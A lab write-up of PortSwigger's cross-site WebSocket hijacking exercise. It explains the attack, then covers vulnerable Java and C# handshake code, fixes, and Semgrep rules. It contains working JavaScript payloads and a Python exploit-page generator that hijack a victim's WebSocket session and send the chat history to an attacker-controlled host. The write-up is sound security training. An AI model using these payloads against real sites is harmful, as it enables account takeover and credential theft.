---
title: "Lab 03: Cross-site WebSocket hijacking"
date: 2025-12-18
categories: [portswigger, websockets]
tags: [websocket] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-18-lab03_websockets/
---

## 1. Executive Summary

**Vulnerability:** Cross-Site WebSocket Hijacking (CSWSH).

**Description:** The application’s WebSocket handshake relies solely on HTTP cookies for session handling and lacks CSRF protection (like unique tokens). This allows an attacker to host a malicious site that, when visited by a logged-in victim, initiates a WebSocket connection to the vulnerable shop on the victim's behalf.

**Impact:** Total Account Takeover. An attacker can exfiltrate sensitive data transmitted via WebSockets—such as private chat histories containing credentials—by leveraging the victim's authenticated session.

## 2. The Attack

**Objective:** Exfiltrate the victim's chat history to steal their login credentials.

### Detailed Attack Path

As illustrated in the provided diagram, the attack follows a multi-step orchestration:

![image.png](image.png)

1. **Create:** The attacker creates a malicious `/exploit` page hosted on an external server. This page contains a JavaScript payload designed to open a WebSocket connection to the target site's `/chat` endpoint.
2. **Phishing:** The attacker sends a link to this exploit page to the victim (e.g., via a phishing email).
3. **Visits:** The victim, who is already logged into the online shop, clicks the link and visits the exploit page.
4. **The Hijack:**  The victim's browser executes the JavaScript.
    - It sends a WebSocket **OPEN** request to the shop. Because the browser automatically includes the victim's **session cookies (SameSite=None)**, the server views this as a legitimate, authenticated request.
    - The script sends the **"READY"** command.
    - The server responds with the victim's **Chat History**.
5. **Exfiltration:** The script captures the incoming chat data and forwards it to the attacker's **Webserver** (in this case, the Exploit Server logs).
    
    ![image.png](image%201.png)
    
    ![image.png](image%202.png)
    

### Exploitation Notes

I initially attempted to solve the lab using a `POST` request to [`webhook.site`](https://webhook.site), but for some reason, the exfiltration didn't succeed. 

```html
<script>
var ws = new WebSocket('wss://your-websocket-url');
ws.onopen = function() {
ws.send("READY");
};
ws.onmessage = function(event) {
fetch('https://your-collaborator-url/', {method: 'POST', mode: 'no-cors', body: event.data});
};
</script>
```

To ensure success, I transitioned to a `GET`-based payload using the lab's own **Exploit Server**. By using `btoa()` to Base64-encode the data, I ensured that JSON characters wouldn't break the URL structure in the exploit logs.

**Final Exploit Payload:**

```html
<script>
    var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");

    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        // Exfiltrate via GET request to the exploit server logs
        fetch("https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit?message=" + btoa(event.data));
    };
</script>
```

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw exists during the **HTTP Upgrade** phase. The server checks for a valid session cookie but does not verify the `Origin` header or require a CSRF token.

- **The Flaw:** The WebSocket protocol does not have built-in CSRF protection. If the handshake relies on cookies, it is inherently vulnerable to cross-site requests.
- **The Reality:** Since browsers automatically attach cookies to cross-site requests, the server cannot distinguish between a request intended by the user and one forced by a malicious script.

### Java (Spring Boot / Handshake Interceptor)

```java
@Configuration
@EnableWebSocket
public class WebSocketConfig implements WebSocketConfigurer {
    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(new ChatHandler(), "/chat")
                // VULNERABLE: Allowing all origins
                .setAllowedOrigins("*") 
                .addInterceptors(new HttpSessionHandshakeInterceptor());
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`.setAllowedOrigins("*")`**: This is the root cause. It tells the server to accept WebSocket handshake requests from *any* domain (including the attacker's exploit server).
- **`HttpSessionHandshakeInterceptor`**: This helper automatically copies the HTTP Session (and cookies) into the WebSocket session. It provides authentication but provides no protection against the request being cross-site.

### C# (ASP.NET Core / WebSocket Middleware)

```csharp
app.UseWebSockets();
app.Use(async (context, next) =>
{
    if (context.Request.Path == "/chat")
    {
        if (context.WebSockets.IsWebSocketRequest)
        {
            // VULNERABLE: No check on context.Request.Headers["Origin"]
            // No CSRF token validation happens here.
            using var webSocket = await context.WebSockets.AcceptWebSocketAsync();
            await HandleChat(webSocket);
        }
    }
    await next();
});
```

**Technical Flow & Syntax Explanation:**

- **`AcceptWebSocketAsync()`**: This method completes the handshake.
- **Logic Gap**: The middleware verifies that the request is a WebSocket request and proceeds. It fails to inspect the `Origin` header to ensure the request came from the shop's own domain, allowing cross-site scripts to "Accept" the connection using the victim's identity.

### Mock PR Comment

The WebSocket handshake at `/chat` is vulnerable to Cross-Site WebSocket Hijacking. It relies on session cookies but does not validate the `Origin` header or implement CSRF tokens.

Please restrict the `AllowedOrigins` to our specific domain and implement a CSRF token check during the initial HTTP upgrade request to ensure the connection is being initiated from our own frontend.

## 4. The Fix

**Explanation of the Fix:**
The primary defense is **Origin Validation**. We must check the `Origin` header on the server and only allow connections from our trusted domain. Additionally, using **SameSite=Strict** cookies prevents the browser from sending session cookies during cross-site handshakes.

### Secure Java (Spring Security)

```java
@Override
public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
    registry.addHandler(new ChatHandler(), "/chat")
            // SECURE: Only allow our specific domain
            .setAllowedOrigins("https://online-shop.com")
            .addInterceptors(new CsrfTokenHandshakeInterceptor());
}
```

**Technical Flow & Syntax Explanation:**

- **`.setAllowedOrigins("https://online-shop.com")`**: This configures a whitelist. If the `Origin` header in the handshake doesn't match this exact string, the server returns a 403 Forbidden.

### Secure C# (Middleware Validation)

```csharp
if (context.Request.Headers["Origin"] != "https://online-shop.com")
{
    context.Response.StatusCode = StatusCodes.Status403Forbidden;
    return;
}
```

---

## 5. Automation

```python
#!/usr/bin/env python3
import argparse
import sys

def generate_exploit_html(target_ws_url, exfil_url):
    template = f"""
<html>
    <body>
        <script>
            var ws = new WebSocket("{target_ws_url}");
            ws.onopen = function() {{ ws.send("READY"); }};
            ws.onmessage = function(event) {{
                fetch("{exfil_url}?data=" + btoa(event.data));
            }};
        </script>
        <h1>Nothing to see here...</h1>
    </body>
</html>
    """
    return template

def main():
    ap = argparse.ArgumentParser(description="Generate CSWSH Exploit Page")
    ap.add_argument("ws_url", help="Target WebSocket URL (wss://...)")
    ap.add_argument("exfil_url", help="Your exfiltration endpoint (GET)")
    args = ap.parse_args()
    
    print("[*] Exploit HTML Generated:")
    print(generate_exploit_html(args.ws_url, args.exfil_url))

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

**The Logic:**

We are looking for WebSocket configurations that either allow all origins (`*`) or explicitly lack an Origin check in the handshake interceptors.

### Java Rule

```yaml
rules:
  - id: java-ws-allow-all-origins
    languages: [java]
    message: "WebSocket AllowedOrigins is set to '*' or is overly broad. This allows CSWSH."
    severity: ERROR
    patterns:
      - pattern: .setAllowedOrigins("*")
```

### C# Rule

```yaml
rules:
  - id: csharp-ws-missing-origin-check
    languages: [csharp]
    message: "WebSocket handshake accepted without Origin header validation."
    severity: WARNING
    patterns:
      - pattern: context.WebSockets.AcceptWebSocketAsync()
      - pattern-not-inside: |
          if (context.Request.Headers["Origin"] == ...) { ... }
```

**Syntax Explanation:**

- **`pattern-not-inside`**: In the C# rule, we flag the acceptance of the socket *unless* it is wrapped in an `if` statement that checks the `Origin` header, forcing developers to implement whitelist logic.
